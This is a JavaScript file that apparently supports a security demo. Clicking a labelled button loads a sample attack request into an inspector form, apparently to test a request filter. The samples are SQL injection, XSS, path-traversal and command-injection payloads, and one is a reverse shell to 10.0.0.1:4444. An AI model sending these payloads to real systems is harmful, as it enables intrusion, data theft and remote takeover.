const SAMPLE_PAYLOADS = [
  // SQL Injection
  {
    label: "SQLi: Auth Bypass",
    category: "sqli",
    color: "red",
    method: "POST",
    path: "/target/login",
    body: "username=admin'+OR+'1'%3D'1&password=x&_csrf_token=bypass12345678",
    headers: "Content-Type: application/x-www-form-urlencoded",
    description: "Classic boolean-based SQL injection auth bypass"
  },
  {
    label: "SQLi: UNION SELECT",
    category: "sqli",
    color: "red",
    method: "GET",
    path: "/target/search?q=' UNION SELECT username,password FROM users--",
    body: "",
    headers: "",
    description: "UNION-based SQL injection to extract data"
  },
  {
    label: "SQLi: Time-Based",
    category: "sqli",
    color: "red",
    method: "GET",
    path: "/target/search?q=1' AND SLEEP(5)--",
    body: "",
    headers: "",
    description: "Blind time-based SQL injection"
  },
  // XSS
  {
    label: "XSS: Script Tag",
    category: "xss",
    color: "orange",
    method: "GET",
    path: "/target/search?q=<script>alert('XSS')</script>",
    body: "",
    headers: "",
    description: "Classic reflected XSS via script tag"
  },
  {
    label: "XSS: Event Handler",
    category: "xss",
    color: "orange",
    method: "GET",
    path: "/target/search?q=<img src=x onerror=alert(1)>",
    body: "",
    headers: "",
    description: "XSS via img onerror event handler"
  },
  {
    label: "XSS: JS Protocol",
    category: "xss",
    color: "orange",
    method: "GET",
    path: "/target/search?q=<a href=javascript:alert(document.cookie)>click</a>",
    body: "",
    headers: "",
    description: "XSS via javascript: pseudo-protocol"
  },
  // Path Traversal
  {
    label: "Path: /etc/passwd",
    category: "traversal",
    color: "yellow",
    method: "GET",
    path: "/target/files?file=../../etc/passwd",
    body: "",
    headers: "",
    description: "Unix path traversal to read /etc/passwd"
  },
  {
    label: "Path: Encoded ../",
    category: "traversal",
    color: "yellow",
    method: "GET",
    path: "/target/files?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    body: "",
    headers: "",
    description: "URL-encoded path traversal bypass"
  },
  // Command Injection
  {
    label: "CMDi: Chained ls",
    category: "cmdi",
    color: "purple",
    method: "GET",
    path: "/target/cmd?host=8.8.8.8; ls -la",
    body: "",
    headers: "",
    description: "Command injection via semicolon chaining"
  },
  {
    label: "CMDi: Pipe bash",
    category: "cmdi",
    color: "purple",
    method: "GET",
    path: "/target/cmd?host=8.8.8.8 | bash -i >& /dev/tcp/10.0.0.1/4444",
    body: "",
    headers: "",
    description: "Reverse shell via pipe to bash"
  },
  {
    label: "CMDi: Substitution",
    category: "cmdi",
    color: "purple",
    method: "GET",
    path: "/target/cmd?host=$(whoami)",
    body: "",
    headers: "",
    description: "Command substitution $() injection"
  },
  // Benign
  {
    label: "✅ Benign: Normal Search",
    category: "benign",
    color: "green",
    method: "GET",
    path: "/target/search?q=hello+world",
    body: "",
    headers: "",
    description: "Normal search query — should be allowed"
  },
];

function getCategoryColor(cat) {
  return {
    sqli: "bg-red-900/60 text-red-300 border-red-700 hover:bg-red-800/60",
    xss: "bg-orange-900/60 text-orange-300 border-orange-700 hover:bg-orange-800/60",
    traversal: "bg-yellow-900/60 text-yellow-300 border-yellow-700 hover:bg-yellow-800/60",
    cmdi: "bg-purple-900/60 text-purple-300 border-purple-700 hover:bg-purple-800/60",
    benign: "bg-green-900/60 text-green-300 border-green-700 hover:bg-green-800/60",
  }[cat] || "bg-gray-800 text-gray-300 border-gray-600 hover:bg-gray-700";
}

function renderPayloadButtons() {
  const container = document.getElementById("payload-buttons");
  if (!container) return;
  SAMPLE_PAYLOADS.forEach((p, i) => {
    const btn = document.createElement("button");
    btn.type = "button";
    btn.textContent = p.label;
    btn.title = p.description;
    btn.className = `text-xs px-2.5 py-1 rounded-lg border transition-colors cursor-pointer ${getCategoryColor(p.category)}`;
    btn.addEventListener("click", () => injectPayload(p));
    container.appendChild(btn);
  });
}

function injectPayload(p) {
  const methodEl = document.getElementById("insp-method");
  const pathEl = document.getElementById("insp-path");
  const bodyEl = document.getElementById("insp-body");
  const headersEl = document.getElementById("insp-headers");
  if (methodEl) methodEl.value = p.method;
  if (pathEl) pathEl.value = p.path;
  if (bodyEl) bodyEl.value = p.body || "";
  if (headersEl) headersEl.value = p.headers || "";
  // Scroll to inspector
  document.getElementById("inspector")?.scrollIntoView({ behavior: "smooth", block: "start" });
}

